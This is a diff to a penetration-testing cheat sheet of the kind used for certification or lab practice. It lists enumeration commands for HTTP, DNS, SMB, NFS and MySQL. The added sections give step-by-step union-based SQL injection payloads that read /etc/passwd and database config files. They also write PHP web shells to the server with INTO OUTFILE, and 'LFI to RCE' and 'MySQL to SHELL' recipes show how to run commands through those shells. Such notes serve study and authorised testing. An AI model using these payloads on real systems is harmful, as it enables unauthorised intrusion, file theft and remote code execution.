@@ -1,6 +1,6 @@
-HTTP Enumeration
+### HTTP ###
 
-http://10.10.10.50/robots.txt
+http://<victim_IP>/robots.txt
 
 DIRECTORY BRUTE FORCE
 
@@ -44,14 +44,54 @@ http://<victim_ip>/test.php?page=../../../../../xampp/apache/bin/php.ini
 
 SQL Injection (Manual Steps)
 
+#Victim Address;
+ http://<victim_ip>/test.php?id=3'
+
+#Find the number of columns;
+ http://<victim_ip>/test.php?id=3 order by 5
+
+#Find space to output db
+ http://<victim_ip>/test.php?id=3 union select 1,2,3,4,5
+
+#Get db-version and username of the db-user;
+ http://<victim_ip>/test.php?id=3 union select 1,2,version(),4,5
+ http://<victim_ip>/test.php?id=3 union select 1,2,user(),4,5
+
+#Get all tables;
+ http://<victim_ip>/test.php?id=3 union select 1,2,table_name,4,5 from information_schema.tables
+
+#Get all columns from a specific table;
+ http://<victim_ip>/test.php?id=3 union select 1,2, column_name 4,5 from information_schema.columns where table_name='wpusers'
+
+#Viewing files;
+ http://<victim_ip>/test.php?id=3' union select 1,2, load_file('/var/www/mysqli_connect.php') ,4,5 -- -
+ http://<victim_ip>/test.php?id=3' union select 1,2, load_file('/etc/passwd') ,4,5 -- -
+	
+#Uploading files;
+ http://<victim_ip>/test.php?id=3' union select null,null, load_file('/var/www/brc_shell.php') ,4,5 -- -
+ http://<victim_ip>/test.php?id=3' union select null,null, "<?php exec($_GET['cmd']) ?>" ,4,5 into outfile '/var/www/brc_shell.php' -- -	
+
+
 ******************************************************************************************************************************
 
 SCENARIOS
 
-#LFI to RCE
+MySQL to SHELL
 
-#MySQL to SHELL
+#Put shell on db to victim system;
+ select 1,2,3,'<?php system($_GET[cmd]); ?>',6,7,8,9,10 INTO OUTFILE '/var/www/brc_shell.php';
 
+#Call the shell and code execution;
+ http://<victim_ip>/shell.php?cmd=ifconfig
+
+
+LFI to RCE
+#Inject shell to victim system;
+ <?php echo shell_exec($_GET["cmd"]); ?>
+ 
+#Call the shell and code execution;
+ http://<victim_ip>/shell.php?cmd=ls -la
+ 
 ******************************************************************************************************************************
 
 CMS Enumeration
@@ -94,52 +134,86 @@ WebDAV Server Attacks
  davtest --url http://<victim_ip>
 
 -------------------------------------------------------------------------------------------------------------------------------
-DNS Enumeration
+
+### DNS ###
 
 Firstly add the domain information detected during port scans to the file "/etc/hosts";
 
-Then check the DNS servers;
+#Then check the DNS servers;
+ dig ns <domain_name>
 
-dig ns active.htb
+ or
 
-or
+ nslookup
+ server <victim_ip>
 
-nslookup
-server <victim_ip>
+#For zone transfer;
+ dig @ns1.example.com example.com axfr
 
-For zone transfer;
-dig @ns1.example.com example.com axfr
+ or
 
-or
-
-host -l active.htb 10.10.10.100
+ host -l <domain_name> <victim_ip>
 
 Note: "dnsrecon" tool can also be used for this.
 
 -------------------------------------------------------------------------------------------------------------------------------
 
-##SMB
+### SMB ###
 
-SMB paylaşımlarının kontrol edilmesi;
+#Controlling SMB shares;
+ smbmap -H <victim_ip>
+ 
+#Connect to SMB shares;
+ smbclient \\\\<victim_ip>\\share_name
+ smbclient \\\\<victim_ip>\\share_name -U mike
+ 
+#Check null sessions;
+ rpcclient -U "" -N <victim_ip>
+  > srvinfo
+	 > enumdomusers
+  > getdompwinfo
+	 > querydominfo
+ 
+ Note: It is found on old windows servers.
+ 
+#Enumerate SMB shares;
+ enum4Linux -a <victim_IP>
 
-smbmap -H active.htb
-smbmap -H 10.10.10.100 
+#SMB version numbering script;
+ smbver.sh -> https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
+ 
+-------------------------------------------------------------------------------------------------------------------------------
 
+### NFS ###
+
+#Controlling public shares;
+ showmount -e <victim_ip>
+
+ Example shares;
+ /var
+ /asd
+
+#Mounting;
+ mkdir brc                   #Indexing
+ mount <victim_ip>:/var brc  #We mount the /var directory that is open on the target to the /brc directory that we have created on our own machine. 
 
 -------------------------------------------------------------------------------------------------------------------------------
-##NFS
 
-Genele açık paylaşımların kontrol edilmesi;
+### MySQL ###
 
-showmount -e 10.10.10.100
-/var
-/asd
+#Connecting to the MySQL;
+ mysql --host=INSERTIPADDRESS -u root -p
+ 
+#Listing databases;
+ show databases
 
-mkdir brc
-mount 10.10.10.100:/var brc  -> kendi makinemizde oluşturduğumuz /brc dizinine hedefte açık olan /var dizinini mount ediyoruz.
+#Choosing a database;
+ use information_schema
 
+#Uploading the shell;
+ select 1,2,3,'<?php system($_GET[cmd]); ?>',6,7,8,9,10 INTO OUTFILE '/var/www/brc_shell.php';
+ 
 -------------------------------------------------------------------------------------------------------------------------------
-
 
 
 
